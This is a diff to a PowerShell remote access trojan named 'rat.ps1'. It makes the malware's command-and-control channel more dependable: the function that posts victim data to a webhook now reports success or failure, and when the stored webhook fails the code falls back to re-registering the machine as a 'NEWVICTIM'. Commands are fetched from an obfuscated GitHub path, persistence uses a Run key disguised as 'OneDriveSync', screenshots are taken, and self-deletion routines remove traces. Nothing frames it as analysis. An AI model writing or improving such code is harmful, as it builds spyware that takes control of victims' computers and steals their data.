@@ -11,6 +11,7 @@ $script:P=2000
 $L='1523845613177929828'
 $HF=Join-Path $env:TEMP 'rat_hook.txt'
 $CG='https://api.github.com/repos/'+'kaikssaqes/'+'rat/'+'contents/'+'cmd.txt'
+$WG=$W
 
 # ---- dedup: exit if another rat.ps1 is already running ----
 try{
@@ -24,13 +25,16 @@ function Post($text){
   try{
     $t=[string]$text
     $n=1900
-    if($t.Length -le $n){ Post-One $t }
+    if($t.Length -le $n){ $r = Post-One $t }
     else{
+      $r=$true
       for($i=0; $i -lt $t.Length; $i+=$n){
-        Post-One $t.Substring($i,[Math]::Min($n,$t.Length-$i))
+        $x = Post-One $t.Substring($i,[Math]::Min($n,$t.Length-$i))
+        if(-not $x){ $r=$false }
       }
     }
-  }catch{}
+    return $r
+  }catch{ return $false }
 }
 
 function Post-One($text){
@@ -40,7 +44,8 @@ function Post-One($text){
     $b=@{'content'=$text}|ConvertTo-Json -Compress
     [void]$wc.UploadString($W,'POST',$b)
     $wc.Dispose()
-  }catch{}
+    return $true
+  }catch{ return $false }
 }
 
 function Upload-File($path){
@@ -240,7 +245,8 @@ function Self-Destruct{
     Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'OneDriveSync' -EA 0
     Remove-Item (Join-Path $env:TEMP 'rat.ps1') -Force -EA 0
     Remove-Item $HF -Force -EA 0
-    Post '`[+] self destructed`'
+        Remove-Item $S -Force -EA 0
+        Post '`[+] self destructed`'
     exit
   }catch{ exit }
 }
@@ -421,9 +427,11 @@ function Run-Cmd($c){
       Post '`[+] killed`'; exit
     }
     elseif($c -eq 'uninstall'){
-      Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'OneDriveSync' -EA 0
-      Post '`[+] uninstalled`'; exit
-    }
+          Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'OneDriveSync' -EA 0
+          Remove-Item $HF -Force -EA 0
+          Remove-Item $S -Force -EA 0
+          Post '`[+] uninstalled`'; exit
+        }
     elseif($c -eq 'whoami'){ Post (whoami) }
     else { Post "`[?] unknown: $c" }
   }catch{}
@@ -444,8 +452,13 @@ if(Test-Path $HF){
   $hf=Get-Content $HF
   $W=$hf[0]
   $C='https://api.github.com/repos/'+'kaikssaqes/'+'rat/'+'contents/'+$hf[1]
-  Post "<@$L> [ONLINE] $VN ($VU @ $VI)"
-  Shot
+  $ok=Post "<@$L> [ONLINE] $VN ($VU @ $VI)"
+  if($ok){ Shot }
+  else{
+    Remove-Item $HF -Force -EA 0
+    $W=$WG; $C=$CG
+    Post "NEWVICTIM $VN $VU $VI"
+  }
 }else{
   Post "NEWVICTIM $VN $VU $VI"
 }
